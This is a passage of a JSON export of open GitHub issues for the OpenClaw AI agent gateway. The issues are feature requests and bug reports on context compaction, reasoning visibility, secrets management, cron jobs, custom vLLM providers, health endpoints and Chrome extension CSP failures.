        "channels": [
          "discord",
          "slack"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13611,
      "title": "Compaction failure should notify user instead of silently failing",
      "body": "## Problem\n\nWhen a session's context grows too large (e.g. 305k tokens vs 200k model limit), auto-compaction fails because the compaction request itself exceeds the model's context window. \n\nThe error is only logged internally:\n```\nCompaction failed: Turn prefix summarization failed: 400 \n{\"type\":\"error\",\"error\":{\"type\":\"invalid_request_error\",\"message\":\"prompt is too long: 305687 tokens > 200000 maximum\"}}\n```\n\n**The user sees nothing** — the agent appears to silently hang/crash with no feedback.\n\n## Expected Behavior\n\nWhen auto-compaction fails, OpenClaw should send a user-visible message to the chat, e.g.:\n\n> ⚠️ Session too long — auto-compaction failed. Please use `/new` to start a fresh session.\n\n## Environment\n\n- OpenClaw 2026.2.9\n- Model: Claude Opus 4 (200k context)\n- Session reached ~305k tokens before compaction triggered",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13611",
      "createdAt": "2026-02-10T18:59:05Z",
      "updatedAt": "2026-02-10T18:59:05Z",
      "author": "clodeku",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 13607,
      "title": "Feature: global default for reasoning visiblity",
      "body": "## Problem\nCurrently, `reasoningLevel` is stored per-session. New sessions default to `off`, requiring users to manually configure each channel/session.\n\n## Proposed Solution\nAdd global defaults in agent configuration:\n\nagents:\n  defaults:\n    reasoningLevel: stream  # off | on | stream\nNew sessions would inherit this default. Per-session overrides via `/reasoning` would still work.\n\n## Settings Explained\n**reasoning** - Controls thinking visibility (same as `/reasoning`):\n\n* `off`: Thinking hidden from user\n* `on`: Show thinking after completion\n* `stream`: Stream thinking live as it happens\n\n## Benefits\n* Consistent behavior across all channels (WhatsApp, Telegram, Discord, etc.)\n* No need to manually configure each session\n* Users can set-and-forget their preferred reasoning level\n\n## Current Workaround\nPatching files to add defaults on session creation\n\nThis is basically the same as #1656. The issue was closed referencing an option that doesn't impact reasoning visibility (verbose mode).",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13607",
      "createdAt": "2026-02-10T18:58:03Z",
      "updatedAt": "2026-02-10T18:59:02Z",
      "author": "jtatum",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "telegram",
          "whatsapp",
          "discord"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13610,
      "title": "Add native secrets management integration (AWS Secrets Manager, Vault, etc.)",
      "body": "## Problem\n\nCurrently, API keys and tokens are stored directly in `openclaw.json` config files. This has several issues:\n\n- **Security risk:** Secrets in plaintext config files\n- **Version control:** Can't safely commit configs to git\n- **Rotation difficulty:** Changing secrets requires config edits and restarts\n- **Compliance:** Many enterprises require centralized secrets management\n- **Audit trails:** No visibility into who accessed what secrets\n\n## Proposed Solution\n\nAdd native support for external secrets management systems:\n\n### Supported Providers\n\n1. **AWS Secrets Manager**\n2. **HashiCorp Vault**\n3. **Azure Key Vault**\n4. **Google Cloud Secret Manager**\n5. **Environment variables** (existing, but formalize)\n\n### Config Syntax\n\n```json\n{\n  \"channels\": {\n    \"slack\": {\n      \"botToken\": \"${aws:openclaw/slack/bot-token}\",\n      \"appToken\": \"${vault:secret/openclaw/slack/app-token}\"\n    }\n  },\n  \"tools\": {\n    \"web\": {\n      \"search\": {\n        \"apiKey\": \"${env:BRAVE_API_KEY}\"\n      }\n    }\n  }\n}\n```\n\n### Features\n\n- **Lazy loading:** Fetch secrets only when needed\n- **Caching:** Cache with TTL, refresh periodically\n- **Fallback:** If provider unavailable, fail gracefully with clear error\n- **Audit logging:** Log secret access (not values, just which secrets)\n\n## Use Cases\n\n- **Enterprise deployments:** Compliance with security policies\n- **CI/CD:** Inject secrets at deploy time without storing in repos\n- **Secret rotation:** Automatic pickup of rotated credentials\n- **Multi-environment:** Different secrets per environment (dev/staging/prod)\n\n## Implementation Ideas\n\n- Provider plugins (similar to channel plugins)\n- String interpolation in config loader\n- AWS IAM role support (no credentials needed on EC2)\n- Vault token via env var or file\n\n## Impact\n\n**High** — Essential for enterprise adoption, security best practices, and compliance requirements.\n\n---\n\n**Note:** Currently secrets like API keys must be redacted from public issues/PRs (security rule), this would eliminate that risk entirely.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13610",
      "createdAt": "2026-02-10T18:58:14Z",
      "updatedAt": "2026-02-10T18:58:14Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13609,
      "title": "Add retry logic for failed cron jobs",
      "body": "## Problem\n\nWhen a cron job fails (network blip, transient API error, temporary service unavailability), it simply moves on to the next scheduled run without retry. This means transient failures can cause missed executions.\n\n## Proposed Solution\n\nAdd configurable retry logic for cron jobs:\n\n```json\n{\n  \"schedule\": { ... },\n  \"retry\": {\n    \"enabled\": true,\n    \"maxAttempts\": 3,\n    \"backoffMs\": 60000,\n    \"backoffMultiplier\": 2\n  }\n}\n```\n\n**Retry behavior:**\n- If job fails, wait `backoffMs` then retry\n- Each retry multiplies backoff (exponential backoff)\n- Stop after `maxAttempts` attempts\n- Log all retry attempts for debugging\n\n## Use Cases\n\n- **Network transients:** Temporary DNS/connection failures\n- **API rate limits:** Retry after backoff when hitting rate limits\n- **Service restarts:** External services temporarily unavailable\n- **CloudWatch monitoring:** Transient AWS API throttling\n\n## Implementation Ideas\n\n- Add `retry` field to job config schema\n- Track retry state in job execution records\n- Emit metrics for retries (success after N attempts, final failure)\n- Option to alert on final failure after all retries exhausted\n\n## Impact\n\n**High** — Makes cron jobs resilient to transient failures, reducing manual intervention and missed executions in production environments.\n\n---\n\nRelated to issue #13582 (cron scheduler reliability)",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13609",
      "createdAt": "2026-02-10T18:58:11Z",
      "updatedAt": "2026-02-10T18:58:11Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13605,
      "title": "Improve cron CLI commands (test, logs, better help)",
      "body": "## Problem\n\nThe current cron CLI is functional but lacks quality-of-life features for debugging and development:\n\n- No way to test a cron job without scheduling it\n- No direct access to job execution logs\n- Help text is minimal, lacks examples\n- Hard to debug why a job isn't working as expected\n\n## Why This Matters\n\n- **Developer productivity** — testing requires waiting for schedule or editing cron expression\n- **Debugging pain** — can't easily see what a job is doing\n- **Learning curve** — examples help users understand features faster\n- **Error prevention** — dry-run catches mistakes before deployment\n\n## Proposed Enhancements\n\n### 1. Test/Dry-Run Command\n\nRun a cron job immediately without waiting for schedule:\n\n```bash\n# Test a job (runs in foreground, shows output)\n$ openclaw cron test daily-backup\nRunning job 'daily-backup' (dry-run mode)...\n\n[2026-02-10 18:56:00] Starting backup...\n[2026-02-10 18:56:02] Backing up database...\n[2026-02-10 18:56:05] Uploading to S3...\n[2026-02-10 18:56:08] ✓ Backup complete\n\nExecution time: 8.2s\nExit code: 0\nStatus: SUCCESS\n\n# Test with different thinking level\n$ openclaw cron test daily-backup --thinking high\n\n# Test but don't actually execute (parse/validate only)\n$ openclaw cron test daily-backup --dry-run\n✓ Job configuration valid\n✓ Schedule parsed: \"0 2 * * *\" (daily at 2am)\n✓ Prompt template valid\n✓ Target channel exists: #cron-jobs\n\n# Test with custom prompt\n$ openclaw cron test daily-backup --prompt \"Run backup for testing\"\n```\n\n**Use cases:**\n- Verify job works before scheduling\n- Debug job failures quickly\n- Test prompt changes\n- Validate configuration\n\n### 2. Logs Command\n\nAccess job execution logs directly:\n\n```bash\n# Show recent logs for a job\n$ openclaw cron logs daily-backup\n[2026-02-10 02:00:15] ✓ SUCCESS (45s)\n[2026-02-09 02:00:12] ✓ SUCCESS (43s)\n[2026-02-08 02:00:10] ✗ FAILED (timeout after 5m)\n[2026-02-07 02:00:11] ✓ SUCCESS (47s)\n\n# Follow logs in real-time (like tail -f)\n$ openclaw cron logs daily-backup --follow\nWaiting for next execution...\n[2026-02-10 19:00:00] Starting execution...\n[2026-02-10 19:00:05] ✓ SUCCESS (5s)\n\n# Show detailed output\n$ openclaw cron logs daily-backup --verbose\n[2026-02-10 02:00:15] Execution ID: exec-abc123\nScheduled: 2026-02-10 02:00:00 UTC\nStarted: 2026-02-10 02:00:15 UTC (+15s delay)\nCompleted: 2026-02-10 02:01:00 UTC\nDuration: 45s\nExit Code: 0\nStatus: SUCCESS\n\nOutput:\n---\nStarting backup process...\nDatabase backup complete: 2.3 GB\nUploaded to s3://backups/2026-02-10.tar.gz\nBackup successful!\n---\n\n# Filter by status\n$ openclaw cron logs daily-backup --failed\n$ openclaw cron logs daily-backup --success\n\n# Show logs from specific time range\n$ openclaw cron logs daily-backup --since 24h\n$ openclaw cron logs daily-backup --since \"2026-02-01\"\n\n# Export logs as JSON\n$ openclaw cron logs daily-backup --json > backup-logs.json\n```\n\n### 3. Enhanced Help Text\n\nCurrent help is minimal. Proposed enhancement:\n\n```bash\n$ openclaw cron --help\n\nUsage: openclaw cron <command> [options]\n\nManage scheduled cron jobs for automated tasks\n\nCommands:\n  add <id>          Create a new cron job\n  remove <id>       Delete a cron job\n  list              List all cron jobs\n  test <id>         Test a job immediately (dry-run)\n  logs <id>         View execution logs for a job\n  pause <id>        Temporarily pause a job\n  resume <id>       Resume a paused job\n  edit <id>         Edit job configuration\n\nExamples:\n  # Create a daily backup job\n  openclaw cron add daily-backup \\\n    --schedule \"0 2 * * *\" \\\n    --prompt \"Run daily backup to S3\" \\\n    --channel \"#cron-jobs\"\n\n  # Test the job before deploying\n  openclaw cron test daily-backup\n\n  # Check execution logs\n  openclaw cron logs daily-backup --since 7d\n\n  # Temporarily disable a job\n  openclaw cron pause daily-backup\n\n  # List all jobs with status\n  openclaw cron list --verbose\n\nSchedule Format:\n  Use standard cron syntax:\n    * * * * *\n    │ │ │ │ └─ Day of week (0-6, Sunday=0)\n    │ │ │ └─── Month (1-12)\n    │ │ └───── Day of month (1-31)\n    │ └─────── Hour (0-23)\n    └───────── Minute (0-59)\n\n  Examples:\n    \"0 2 * * *\"       Every day at 2am\n    \"*/15 * * * *\"    Every 15 minutes\n    \"0 9 * * 1\"       Every Monday at 9am\n    \"0 0 1 * *\"       First day of every month at midnight\n\nFor more information:\n  https://docs.openclaw.ai/cron\n```\n\n### 4. Better Status Display\n\nEnhance `openclaw cron list` output:\n\n```bash\n$ openclaw cron list\n\n┌──────────────────┬─────────────────┬─────────────────────┬──────────┬──────────┐\n│ ID               │ Schedule        │ Next Run            │ Status   │ Success  │\n├──────────────────┼─────────────────┼─────────────────────┼──────────┼──────────┤\n│ daily-backup     │ 0 2 * * *       │ 2026-02-11 02:00:00 │ ✓ Active │ 98.5%    │\n│ hourly-check     │ 0 * * * *       │ 2026-02-10 19:00:00 │ ✓ Active │ 100%     │\n│ weekly-report    │ 0 9 * * 1       │ 2026-02-17 09:00:00 │ ⏸ Paused │ -        │\n│ failing-job      │ */5 * * * *     │ 2026-02-10 19:00:00 │ ⚠ Failing│ 45.2%    │\n└──────────────────┴─────────────────┴─────────────────────┴──────────┴──────────┘\n\n4 jobs total (3 active, 1 paused)\n\nUse 'openclaw cron logs <id>' to view execution history\n```\n\n### 5. Edit Command\n\nEdit job configuration interactively:\n\n```bash\n# Open editor with current config\n$ openclaw cron edit daily-backup\n\n# Or update specific fields\n$ openclaw cron edit daily-backup --schedule \"0 3 * * *\"\n$ openclaw cron edit daily-backup --prompt \"New backup prompt\"\n$ openclaw cron edit daily-backup --thinking high\n```\n\n## Implementation Approach\n\n### Test Command\n```typescript\ncommand('cron test <id>')\n  .option('--dry-run', 'Validate without executing')\n  .option('--thinking <level>', 'Override thinking level')\n  .option('--prompt <text>', 'Override prompt')\n  .action(async (id, options) => {\n    const job = await getJob(id);\n    if (options.dryRun) {\n      await validateJob(job);\n      console.log('✓ Job configuration valid');\n    } else {\n      console.log(`Running job '${id}'...`);\n      const result = await executeJobNow(job, options);\n      displayResult(result);\n    }\n  });\n```\n\n### Logs Command\n```typescript\ncommand('cron logs <id>')\n  .option('--follow', 'Follow logs in real-time')\n  .option('--verbose', 'Show detailed output')\n  .option('--failed', 'Show only failed executions')\n  .option('--since <time>', 'Show logs since time')\n  .option('--json', 'Output as JSON')\n  .action(async (id, options) => {\n    if (options.follow) {\n      await followLogs(id);\n    } else {\n      const logs = await getJobLogs(id, options);\n      displayLogs(logs, options);\n    }\n  });\n```\n\n## Acceptance Criteria\n\n- [ ] `openclaw cron test <id>` runs job immediately\n- [ ] `openclaw cron test <id> --dry-run` validates without executing\n- [ ] `openclaw cron logs <id>` shows execution history\n- [ ] `openclaw cron logs <id> --follow` tails logs in real-time\n- [ ] `openclaw cron --help` shows examples and schedule format guide\n- [ ] `openclaw cron list` shows enhanced status table\n- [ ] `openclaw cron edit <id>` allows configuration updates\n- [ ] All commands have proper error messages\n- [ ] Documentation updated with new commands\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13605",
      "createdAt": "2026-02-10T18:57:27Z",
      "updatedAt": "2026-02-10T18:57:27Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 10354,
      "title": "[Feature]: Add description and enum to message tool's channel parameter",
      "body": "## Summary\n\nThe `message` tool's `channel` parameter (`src/agents/tools/message-tool.ts`, line 40 in `buildRoutingSchema`) is defined as a bare `Type.Optional(Type.String())` with no description or enum constraint. This causes AI agents to pass Slack/Discord channel IDs (e.g. `C07ABC1234X`) instead of provider names (e.g. `slack`), resulting in \"Unknown channel\" errors from `normalizeAnyChannelId`.\n\nThe system prompt's Messaging section does document the expected values (`telegram|whatsapp|discord|googlechat|slack|signal|imessage`), but the tool schema itself provides no guidance. Since other parameters in the same schema include descriptions (e.g. `target: \"Target channel/user id or name.\"`), the empty `channel` description stands out as an oversight.\n\n## Proposed solution\n\nAdd a description to the `channel` parameter in `buildRoutingSchema()`:\n\n```typescript\nchannel: Type.Optional(Type.String({\n  description: \"Messaging provider name (e.g. 'slack', 'discord'). Not the channel/conversation ID.\",\n})),\n```\n\nOptionally, an enum constraint could also help, though dynamic channel availability may make a static enum impractical.\n\n## Alternatives considered\n\n- **Prompt-only fix**: The system prompt already documents this, but agents can miss prompt instructions when tool schemas accept arbitrary strings.\n- **Fallback resolution in normalizeAnyChannelId**: Detect Slack-style IDs (starting with `C`, `U`, `G`) and auto-route. Adds complexity and only covers known formats.\n\n## Additional context\n\n- Discovered while debugging an \"Unknown channel\" error on a self-hosted OpenClaw Slack instance\n- The agent could receive and reply to messages via auto-reply, but tool-based message operations failed\n- Telling the agent to pass `channel: \"slack\"` instead of the Slack channel ID immediately resolved the issue\n- Related (but distinct) issue: #4751 (Slack IDs lowercased in normalizeSlackMessagingTarget)\n\n✍️ **Author**: Claude Code with @carrotRakko (AI-written, human-approved)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/10354",
      "createdAt": "2026-02-06T11:10:05Z",
      "updatedAt": "2026-02-10T18:57:08Z",
      "author": "carrotRakko",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "telegram",
          "whatsapp",
          "discord",
          "googlechat",
          "slack",
          "signal",
          "imessage"
        ],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3880097772,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10354#issuecomment-3880097772",
          "createdAt": "2026-02-10T18:57:08Z",
          "updatedAt": "2026-02-10T18:57:08Z",
          "author": "carrotRakko",
          "body": "Resubmitted as #13584 — previous PR #10364 was auto-closed when the fork was deleted and recreated.\n\n✍️ Author: Claude Code with @carrotRakko (AI-written, human-approved)"
        }
      ]
    },
    {
      "number": 13603,
      "title": "Custom provider (vLLM/Qwen) responses silently dropped — assistant messages never routed to webchat",
      "body": "# Custom provider (vLLM/Qwen) responses silently dropped — assistant messages never routed to webchat\n\n## Description\n\nWhen using a custom OpenAI-compatible provider (vLLM serving Qwen3-Coder-Next-FP8 on NVIDIA DGX Spark), the gateway accepts user messages, sends them to the model, receives successful `200 OK` responses from vLLM, but **assistant responses are never delivered to webchat**. The session becomes a black hole — messages go in, nothing comes back.\n\n## Environment\n\n- **OpenClaw:** v2026.2.9\n- **OS:** Ubuntu Linux 6.17.0-14-generic (x64)\n- **Node:** v22.22.0\n- **Model:** `Qwen/Qwen3-Coder-Next-FP8` (72B params) via vLLM\n- **Provider:** Custom OpenAI-compatible (`dgx`) at `http://10.0.1.34:8000/v1`\n- **Channel:** webchat\n- **Primary model config:** `dgx/Qwen/Qwen3-Coder-Next-FP8` with fallback `anthropic/claude-opus-4-6`\n\n## Steps to Reproduce\n\n1. Configure a custom provider pointing to a vLLM instance serving Qwen3-Coder-Next-FP8\n2. Set it as the primary model\n3. Restart gateway\n4. Send messages via webchat\n5. Observe: runs start (`embedded run start` logged) but text never appears in webchat\n\n## Observed Behavior\n\n### Gateway logs show runs starting and completing, but no text is delivered:\n\n```\n[agent/embedded] embedded run start: runId=... provider=dgx model=Qwen/Qwen3-Coder-Next-FP8\n[agent/embedded] embedded run prompt end: runId=... durationMs=49680\n[agent/embedded] embedded run done: runId=... durationMs=49736 aborted=false\n```\n\n### Orphaned user messages accumulate:\n\n```\n[agent/embedded] Removed orphaned user message to prevent consecutive user turns. runId=... sessionId=...\n```\n\nThis happens because the previous run produces no recognized assistant message, so the next user message triggers the orphan cleanup.\n\n### vLLM side confirms successful processing:\n\n```\nINFO: 10.0.1.29:42614 - \"POST /v1/chat/completions HTTP/1.1\" 200 OK\nAvg prompt throughput: 2215.6 tokens/s, Avg generation throughput: 3.7 tokens/s\n```\n\n### vLLM warns about unsupported parameters:\n\n```\nWARNING: The following fields were present in the request but ignored: {'strict'}\nWARNING: The following fields were present in the request but ignored: {'store'}\n```\n\n### Direct API test works fine:\n\n```bash\ncurl http://10.0.1.34:8000/v1/chat/completions \\\n  -d '{\"model\":\"Qwen/Qwen3-Coder-Next-FP8\",\"messages\":[{\"role\":\"user\",\"content\":\"Say hello\"}],\"max_tokens\":50}'\n```\n\nReturns a valid response:\n```json\n{\n  \"choices\": [{\n    \"message\": {\n      \"role\": \"assistant\",\n      \"content\": \"Hello! 😊 How can I help you today?\",\n      \"tool_calls\": [],\n      \"reasoning_content\": null\n    },\n    \"finish_reason\": \"stop\"\n  }]\n}\n```\n\n## Suspected Root Cause\n\nThe vLLM response includes fields that may confuse OpenClaw's response parser:\n\n1. **`tool_calls: []`** — empty array instead of absent/null. If the parser interprets this as a tool-calling response, it may wait for tool results that never come.\n2. **`reasoning_content: null`** — explicit null instead of absent. May confuse thinking/reasoning detection.\n3. **`refusal: null`, `annotations: null`, `audio: null`, `function_call: null`** — multiple null fields that standard Anthropic/OpenAI responses don't include.\n\nThe initial messages after a model switch DO work briefly (text is delivered), but after the session context grows (compaction, tool definitions, workspace files), responses stop being recognized.\n\n## Run Duration Analysis\n\nCompleted runs with no visible output took 13–49 seconds:\n\n| Run | Duration | Aborted? |\n|-----|----------|----------|\n| 74352b37 | 13,733ms | No |\n| f12eb1bc | 16,749ms | No |\n| 8088165c | 49,680ms | No |\n| f2982293 | 37,024ms | Yes |\n| c079b870 | 29,420ms | No |\n| b6efc59c | 1,106ms | Yes |\n\nNote: Generation throughput drops to ~3.7 tok/s under the full OpenClaw system prompt (vs 100+ tok/s with simple prompts), suggesting the large context significantly impacts performance.\n\n## Expected Behavior\n\nAssistant responses from custom OpenAI-compatible providers should be delivered to the webchat channel, even if the response includes extra/null fields like `tool_calls: []` or `reasoning_content: null`.\n\n## Workaround\n\nSwitching back to `anthropic/claude-opus-4-6` immediately resolves the issue — all responses route correctly.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13603",
      "createdAt": "2026-02-10T18:56:38Z",
      "updatedAt": "2026-02-10T18:56:38Z",
      "author": "rrstesiak",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13602,
      "title": "Add /health endpoint for AWS ALB and Kubernetes probes",
      "body": "## Problem\n\nOpenClaw gateway lacks a standard health check endpoint, making it difficult to integrate with modern cloud infrastructure:\n\n- AWS Application Load Balancers (ALB) need health checks\n- Kubernetes liveness/readiness probes require HTTP endpoints\n- Monitoring systems need a simple way to verify gateway health\n- No way to detect degraded state (cron failing, channels disconnected, etc.)\n\n## Why This Matters\n\n- **Cloud deployments** — ALB/K8s are standard patterns, need native support\n- **High availability** — health checks enable automatic failover\n- **Observability** — monitoring systems need programmatic health status\n- **Production readiness** — health endpoints are table stakes for production services\n- **Graceful degradation** — can report \"degraded\" vs \"down\"\n\n## Current Situation\n\n**No health endpoint exists:**\n```bash\n$ curl http://localhost:3000/health\n404 Not Found\n```\n\n**Workarounds:**\n- Ping the main endpoint (not health-specific)\n- Parse logs (brittle and slow)\n- Blind deployment (no health awareness)\n\n## Proposed Solution\n\n### 1. Basic Health Endpoint\n\n```bash\n$ curl http://localhost:3000/health\n{\n  \"status\": \"healthy\",\n  \"timestamp\": 1707593143000,\n  \"uptime\": 86400,\n  \"version\": \"0.5.2\"\n}\n```\n\n**HTTP Status Codes:**\n- `200` - Healthy (all systems operational)\n- `503` - Unhealthy (service down or critical failure)\n- `500` - Degraded (partial functionality)\n\n### 2. Detailed Health Status\n\n```bash\n$ curl http://localhost:3000/health?detailed=true\n{\n  \"status\": \"degraded\",\n  \"timestamp\": 1707593143000,\n  \"uptime\": 86400,\n  \"version\": \"0.5.2\",\n  \"components\": {\n    \"gateway\": {\n      \"status\": \"healthy\",\n      \"message\": \"Gateway operational\"\n    },\n    \"cron\": {\n      \"status\": \"degraded\",\n      \"message\": \"2 jobs failing\",\n      \"details\": {\n        \"totalJobs\": 5,\n        \"failingJobs\": 2,\n        \"jobsOverdue\": 1\n      }\n    },\n    \"channels\": {\n      \"status\": \"healthy\",\n      \"message\": \"All channels connected\",\n      \"details\": {\n        \"slack\": \"connected\",\n        \"discord\": \"connected\"\n      }\n    },\n    \"database\": {\n      \"status\": \"healthy\",\n      \"message\": \"Database responding\"\n    },\n    \"nodes\": {\n      \"status\": \"healthy\",\n      \"message\": \"3 nodes paired\",\n      \"details\": {\n        \"paired\": 3,\n        \"active\": 2,\n        \"inactive\": 1\n      }\n    }\n  }\n}\n```\n\n### 3. Component-Specific Health Checks\n\n```bash\n# Check only cron health\n$ curl http://localhost:3000/health/cron\n{\n  \"status\": \"degraded\",\n  \"component\": \"cron\",\n  \"totalJobs\": 5,\n  \"failingJobs\": 2,\n  \"jobsOverdue\": 1,\n  \"lastCheck\": 1707593143000\n}\n\n# Check channel health\n$ curl http://localhost:3000/health/channels\n{\n  \"status\": \"healthy\",\n  \"component\": \"channels\",\n  \"slack\": \"connected\",\n  \"discord\": \"connected\"\n}\n```\n\n### 4. Readiness vs Liveness\n\nFor Kubernetes, separate endpoints:\n\n**Liveness (is the service running?):**\n```bash\n$ curl http://localhost:3000/health/live\n200 OK\n{\"alive\": true}\n```\n\n**Readiness (is the service ready to handle traffic?):**\n```bash\n$ curl http://localhost:3000/health/ready\n200 OK if:\n- Gateway started\n- Channels connected\n- Database accessible\n\n503 Service Unavailable if:\n- Still initializing\n- Critical component failed\n```\n\n## Implementation Approach\n\n### Express Route Handler\n\n```typescript\napp.get('/health', async (req, res) => {\n  const detailed = req.query.detailed === 'true';\n  \n  const health = await checkHealth(detailed);\n  \n  const statusCode = \n    health.status === 'healthy' ? 200 :\n    health.status === 'degraded' ? 500 : 503;\n  \n  res.status(statusCode).json(health);\n});\n\napp.get('/health/live', (req, res) => {\n  res.status(200).json({ alive: true });\n});\n\napp.get('/health/ready', async (req, res) => {\n  const ready = await isServiceReady();\n  res.status(ready ? 200 : 503).json({ ready });\n});\n```\n\n### Health Check Logic\n\n```typescript\nasync function checkHealth(detailed: boolean) {\n  const components = {\n    cron: await checkCronHealth(),\n    channels: await checkChannelHealth(),\n    database: await checkDatabaseHealth(),\n    nodes: await checkNodeHealth()\n  };\n  \n  const overallStatus = determineOverallStatus(components);\n  \n  return {\n    status: overallStatus,\n    timestamp: Date.now(),\n    uptime: process.uptime(),\n    version: VERSION,\n    components: detailed ? components : undefined\n  };\n}\n\nfunction determineOverallStatus(components: any): string {\n  const statuses = Object.values(components).map(c => c.status);\n  \n  if (statuses.includes('unhealthy')) return 'unhealthy';\n  if (statuses.includes('degraded')) return 'degraded';\n  return 'healthy';\n}\n```\n\n## AWS ALB Configuration\n\n```yaml\nHealthCheck:\n  Path: /health\n  Protocol: HTTP\n  Port: 3000\n  HealthyThresholdCount: 2\n  UnhealthyThresholdCount: 3\n  TimeoutSeconds: 5\n  IntervalSeconds: 30\n  Matcher:\n    HttpCode: 200,500  # 200 = healthy, 500 = degraded (still serve traffic)\n```\n\n## Kubernetes Configuration\n\n```yaml\nlivenessProbe:\n  httpGet:\n    path: /health/live\n    port: 3000\n  initialDelaySeconds: 10\n  periodSeconds: 10\n  timeoutSeconds: 3\n  failureThreshold: 3\n\nreadinessProbe:\n  httpGet:\n    path: /health/ready\n    port: 3000\n  initialDelaySeconds: 5\n  periodSeconds: 5\n  timeoutSeconds: 3\n  failureThreshold: 2\n```\n\n## Use Cases\n\n### 1. Load Balancer Health\n```bash\n# ALB polls every 30s\nGET /health\n→ 200 OK (healthy, send traffic)\n→ 500 (degraded, still send traffic but alert)\n→ 503 (unhealthy, remove from pool)\n```\n\n### 2. Monitoring Dashboard\n```bash\n# Datadog/Grafana pulls detailed status every minute\nGET /health?detailed=true\n→ Parse components\n→ Alert on degraded/unhealthy\n→ Display component status in dashboard\n```\n\n### 3. Deployment Verification\n```bash\n# CI/CD checks health after deploy\n$ curl -f http://gateway:3000/health/ready\n→ Exit 0 if ready (continue deployment)\n→ Exit 1 if not ready (rollback)\n```\n\n### 4. Debug Issues\n```bash\n# Quick health check during incident\n$ curl http://localhost:3000/health?detailed=true | jq\n→ Instantly see which components are failing\n```\n\n## Security Considerations\n\n- Health endpoint should NOT require authentication (needed by infra)\n- Don't expose sensitive data in health responses\n- Rate limit to prevent abuse (100 req/min per IP)\n- Detailed mode could be restricted to internal networks only\n\n## Acceptance Criteria\n\n- [ ] `/health` endpoint returns 200/500/503 based on status\n- [ ] `/health?detailed=true` includes component breakdown\n- [ ] `/health/live` always returns 200 (liveness probe)\n- [ ] `/health/ready` returns 503 until fully initialized\n- [ ] Cron job failures affect health status\n- [ ] Channel disconnections affect health status\n- [ ] Works with AWS ALB health checks\n- [ ] Works with Kubernetes probes\n- [ ] Documentation with ALB/K8s examples\n- [ ] Rate limiting configured\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13602",
      "createdAt": "2026-02-10T18:56:35Z",
      "updatedAt": "2026-02-10T18:56:35Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [
          "discord",
          "slack"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13600,
      "title": "Chrome extension relay fails on CSP-protected sites (Apple Music, banking, etc.)",
      "body": "## Problem\n\nThe Chrome extension relay (Browser Relay / `profile=\"chrome\"`) fails to inject on sites with strict Content Security Policies (CSP). This blocks browser automation on major sites including:\n\n- Apple Music (tested and confirmed)\n- Banking sites\n- Enterprise web apps\n- Government portals\n- Any site with `script-src 'self'` or restrictive CSP headers\n\n## Why This Matters\n\n- **Limited automation coverage** — can't control many real-world sites\n- **Poor user experience** — extension appears broken on popular sites\n- **No clear error** — fails silently or with cryptic console errors\n- **Workaround required** — have to switch to `profile=\"openclaw\"` (separate browser)\n\n## Reproduction Steps\n\n1. Install OpenClaw Chrome extension\n2. Open Apple Music (music.apple.com)\n3. Click Browser Relay toolbar icon to attach tab\n4. Try to automate the page:\n   ```typescript\n   browser.action({\n     action: \"snapshot\",\n     profile: \"chrome\"\n   })\n   ```\n5. **Result:** Extension fails to inject, automation doesn't work\n\n### Console Error (typical):\n```\nRefused to execute inline script because it violates the following \nContent Security Policy directive: \"script-src 'self' 'unsafe-eval'\"\n```\n\n## Current Behavior\n\n- Extension loads in toolbar\n- User clicks to attach tab\n- Badge shows \"ON\" (misleadingly)\n- Automation commands fail or timeout\n- No user-facing error explaining CSP block\n\n## Expected Behavior\n\n### Option 1: Detect and Warn\n- Extension detects CSP restrictions\n- Shows clear warning: \"This site blocks extensions. Use profile='openclaw' instead.\"\n- Badge shows warning icon instead of \"ON\"\n\n### Option 2: Fallback Mechanism\n- Detect CSP block automatically\n- Fall back to CDP/DevTools protocol (doesn't require content script injection)\n- Or automatically route to `profile=\"openclaw\"` browser\n\n### Option 3: Manifest V3 Workarounds\n- Investigate `world: \"MAIN\"` injection (if possible with CSP)\n- Use Service Workers for automation logic\n- CDP connection as primary mechanism\n\n## Technical Details\n\n**Why CSP blocks extensions:**\n- Content scripts are treated as inline scripts\n- CSP `script-src` directive blocks inline script execution\n- Even browser extensions with `content_scripts` in manifest can be blocked\n\n**Sites that are problematic:**\n- Apple Music: `script-src 'self' 'unsafe-eval' ...`\n- Banks: Very restrictive CSP\n- Corporate apps: Often block all external scripts\n\n## Suggested 